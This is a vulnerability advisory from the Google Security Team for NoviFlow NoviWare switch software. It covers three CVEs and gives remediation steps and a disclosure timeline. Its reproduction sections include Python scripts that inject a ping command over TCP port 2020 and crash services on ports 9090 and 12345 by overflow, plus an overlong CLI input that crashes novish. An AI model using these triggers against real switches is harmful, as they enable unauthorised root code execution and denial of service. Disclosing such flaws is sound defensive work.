NoviFlow NoviWare <= NW400.2.6 multiple vulnerabilities


Introduction
==========
NoviWare is a high-performance OpenFlow 1.3, 1.4 and 1.5 compliant
switch software developed by NoviFlow and available for license to
network equipment manufacturers.
Multiple vulnerabilities were identified in the NoviWare software
deployed on NoviSwitch devices. They could allow a remote attacker to
gain privileged code execution on the switch (non-default
configuration) or a low-privileged CLI user to execute code as root.


CVEs
=====
* CVE-2017-12784: remote code execution in novi_process_manager_daemon
Indicative CVSS v2 base score: 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C)

* CVE-2017-12785: cli breakout in novish
Indicative CVSS v2 base score: 6.8 (AV:L/AC:L/Au:S/C:C/I:C/A:C)

* CVE-2017-12786: remote code execution in noviengine and cliengine
Indicative CVSS v2 base score: 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C)


Affected versions
==============
NoviWare <= NW400.2.6 and devices where a vulnerable NoviWare version
is deployed


Author
======
François Goichon - Google Security Team


CVE-2017-12784
==============
Remote code execution in novi_process_manager_daemon

Summary
-------------
The NoviWare switching software distribution is prone to two distinct
bugs which could potentially allow a remote, unauthenticated attacker
to gain privileged (root) code execution on the switch device.
- A flaw when applying ACL changes requested from the CLI could expose
the novi_process_manager_daemon network service
- This network service is prone to command injection and a stack-based
buffer overflow

Reproduction
------------------
If TCP port 2020 is accepting connections from the network, the
following python script can be used to ping yourself on vulnerable
versions :
---
from struct import pack
import socket

s = socket.socket()
s.connect((<switch host>, 2020))

payload = pack("<I", 0xffffffff).ljust(0x24) + "ping <your ip>; echo\x00"
s.sendall(pack("<II", 1, len(payload)+8))
s.sendall(payload)

s.close()
---

On vulnerable versions, the appliance will perform an ICMP request to
the specified IP, which can be observed in network logs.

Remediation
-----------------
- Upgrade to NoviWare400 3.0 or later.
- NoviFlow customers should have received instructions on how to get
the latest release along with release notes. For more information,
contact support@noviflow.com.


CVE-2017-12785
==============
Cli breakout in novish

Summary
-------------
The NoviWare switching software distribution is prone to a buffer
overflow and a command injection, allowing authenticated,
low-privileged users to break out of the CLI and execute commands as
root.

Reproduction
------------------
Log in to the appliance via SSH and run the following command from the CLI:
--
noviswitch# show log cli username
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
--

If the appliance is vulnerable, the cli crashes and the session ends.

Remediation
-----------------
- Upgrade to NoviWare400 3.0 or later.
- NoviFlow customers should have received instructions on how to get
the latest release along with release notes. For more information,
contact support@noviflow.com.


CVE-2017-12786
==============
Remote code execution in noviengine and cliengine

Summary
-------------
The NoviWare switching software distribution is prone to two distinct
bugs which could potentially allow a remote, unauthenticated attacker
to gain privileged (root) code execution on the switch device.
- A flaw when applying ACL changes requested from the CLI could expose
noviengine and cliengine network services
- These network services are prone to a stack-based buffer overflow
when unpacking serialized values.

Reproduction
------------------
If TCP ports 9090 or 12345 are accepting connections from the network,
the following python script can be used to cause a crash on vulnerable
versions :
---
from struct import pack
import socket

s = socket.socket()
s.connect((<switch host>, <9090 or 12345>))

payload = "".join([pack("<I", 4) + "AAAA" for i in xrange(408)])
payload = pack("<IIQ", 0, len(payload) + 16, 0) + payload
s.sendall(payload)

s.read(1)
s.close()
---

A watchdog should restart the service if it has crashed.

Remediation
-----------------
- Upgrade to NoviWare400 3.0 or later.
- NoviFlow customers should have received instructions on how to get
the latest release along with release notes. For more information,
contact support@noviflow.com.


Disclosure timeline
===============
2017/05/11 - Report sent to NoviFlow
2017/05/26 - Bugs acknowledged and remediation timeline confirmed
2017/07/27 - NoviWare400 3.0 release fixes all the above vulnerabilities
2017/08/09 - CVE requests
2017/08/16 - Public disclosure